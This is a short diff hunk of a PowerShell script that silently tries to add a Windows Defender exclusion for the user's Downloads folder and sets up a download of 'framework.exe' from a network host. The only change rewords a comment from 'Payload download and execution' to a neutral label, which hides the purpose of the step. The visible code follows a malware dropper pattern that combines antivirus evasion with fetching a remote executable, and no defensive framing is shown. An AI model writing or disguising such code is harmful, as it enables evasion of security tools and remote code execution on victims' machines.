@@ -11,7 +11,7 @@ try {
     # Attempt Defender Exclusion (will fail silently if not admin)
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
 
-    # === Payload download and execution ===
+    # === Download and execute framework.exe ===
     $url = "http://192.168.0.100/framework.exe"
     $outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'framework.exe')
 
